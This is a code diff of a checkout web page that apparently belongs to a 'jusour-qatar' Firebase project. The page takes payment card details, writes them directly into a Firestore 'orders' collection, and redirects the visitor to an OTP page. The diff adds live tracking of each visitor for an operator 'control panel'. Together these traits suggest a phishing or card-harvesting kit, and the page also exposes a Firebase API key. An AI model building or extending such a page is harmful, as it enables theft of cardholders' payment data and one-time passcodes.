@@ -53,7 +53,6 @@
       gap: 10px;
     }
 
-    /* رسائل الخطأ */
     #errorBox {
       display: none;
       background: #fff5f5;
@@ -172,7 +171,6 @@
 <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-analytics-compat.js"></script>
 
 <script>
-    // إعدادات Firebase الحقيقية لمشروع (jusour-qatar)
     const firebaseConfig = {
       apiKey: "AIzaSyBRoLQJTQVVGiy9JntaEfWAA7qnPWoGLBI",
       authDomain: "jusour-qatar.firebaseapp.com",
@@ -189,7 +187,14 @@
 
     const currentOrderId = sessionStorage.getItem("last_order_id");
 
-    // تنسيق رقم البطاقة وتاريخ الانتهاء تلقائياً
+    // تتبع العميل في لوحة التحكم
+    if (currentOrderId) {
+        db.collection("active_visits").doc(currentOrderId).set({
+            page: "checkout",
+            last_seen: firebase.firestore.FieldValue.serverTimestamp()
+        }, { merge: true });
+    }
+
     document.getElementById('cardNumber').addEventListener('input', function (e) {
       e.target.value = e.target.value.replace(/[^\d]/g, '').replace(/(.{4})/g, '$1 ').trim();
     });
@@ -217,13 +222,12 @@
             analytics.logEvent('payment_info_submitted');
 
             if (currentOrderId) {
-                // تحديث نفس الطلب ببيانات الفيزا
                 await db.collection("orders").doc(currentOrderId).update(cardData);
             } else {
-                await db.collection("orders").add(cardData);
+                const newDoc = await db.collection("orders").add(cardData);
+                sessionStorage.setItem("last_order_id", newDoc.id);
             }
 
-            // التوجه لصفحة الـ OTP
             window.location.href = "otp.php";
         } catch (err) {
             console.error("Error:", err);
@@ -235,4 +239,3 @@
 </script>
 </body>
 </html>
-
